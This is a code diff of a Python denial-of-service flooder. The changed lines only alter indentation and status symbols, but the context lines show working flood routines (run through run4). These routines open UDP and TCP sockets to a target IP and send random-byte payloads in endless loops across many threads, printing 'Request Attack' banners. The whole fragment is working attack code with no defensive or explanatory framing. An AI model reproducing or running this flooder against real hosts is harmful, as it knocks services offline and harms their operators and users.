@@ -75,7 +75,7 @@ time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
-		i = random.choice(("[-]","[+]"))
+	i = random.choice(("[!]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -84,11 +84,11 @@ def run():
 				s.sendto(data,addr)
 			print(i + "\033[95m[\033[97m+\033[95m]   \033[94mRequest Attack  :. " +ip+ " \033[0m")
 		except:
-			print("\033[33m[\033[95m-\033[33m] Error!")
+			print("\033[33m[\033[95m!\033[33m] Error!")
 
 def run2():
 	data = random._urandom(999)
-		i = random.choice(("[-]","[+]"))
+	i = random.choice(("[-]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -104,7 +104,7 @@ def run2():
 
 def run3():
 	data = random._urandom(818)
-		i = random.choice(("[-]","[+]"))
+	i = random.choice(("[!]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -112,7 +112,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[95m[\033[97m+\033[95m]   \033[92mStatus Sent ::::..." +ip+ " \033[0m")
+			print(i + "\033[95m[\033[97m!\033[95m]   \033[92mStatus Sent ::::..." +ip+ " \033[0m")
 		except:
 			s.close()
 			print("\033[33m[\033[95m-\033[33m] Error!")
@@ -120,7 +120,7 @@ def run3():
   
 def run4():
 	data = random._urandom(16)
-	i = random.choice(("[-]","[+]"))
+	i = random.choice(("[!]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -131,7 +131,7 @@ def run4():
 			print(i + "\033[95m[\033[97m+\033[95m]  \033[91mRequest Sent :::..  " +ip+ " \033[0m")
 		except:
 			s.close()
-			print("\033[33m[\033[95m-\033[33m] Error!")
+			print("\033[33m[\033[95m!\033[33m] Error!")
 											
             
 for y in range(threads):
